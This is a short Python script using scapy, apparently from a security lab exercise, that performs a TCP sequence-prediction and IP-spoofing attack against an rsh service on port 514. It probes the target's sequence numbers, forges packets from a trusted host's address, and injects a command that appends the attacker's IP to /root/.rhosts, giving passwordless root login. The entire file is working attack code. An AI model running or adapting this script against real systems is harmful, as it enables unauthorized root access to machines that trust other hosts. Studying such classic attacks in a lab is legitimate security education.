from scapy.all import *
from random import randrange

import sys

if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    #TODO: figure out SYN sequence number pattern
    #for i in range(4):
    # Pattern seems to be that every SEQ is 64000 more than the last
    ip=IP(dst=target_ip)
    source_port = randrange(513, 1024)
    syn_packet = TCP(sport=source_port, dport=514, flags="S", seq=100)
    synack_packet = sr1(ip/syn_packet, verbose=0, timeout=1)
    
    # reset port after initial experiment
    rst_packet = TCP(sport=source_port, dport=514, flags="R")
    send(ip / rst_packet)

    #print(i, syn_packet[TCP].sport)
    if synack_packet:
        synack_packet.show()
    

    spoof_ip = IP(dst=target_ip, src=trusted_host_ip)
    send(spoof_ip / syn_packet)

    next_seq = synack_packet[TCP].seq + 64000

    #TODO: TCP hijacking with predicted sequence number
    spoof_ack_packet = TCP(sport=source_port, dport=514, flags="A", seq=101, ack=next_seq+1)
    ap_packet = TCP(sport=source_port, dport=514, flags="AP", seq=101, ack=next_seq+1)

    hack_data = b"root\x00root\x00echo '" + my_ip.encode('utf-8') + b" root' >> /root/.rhosts\x00"
    
    send(spoof_ip / spoof_ack_packet)
    
    send(spoof_ip / ap_packet / (b'\x00'+hack_data))
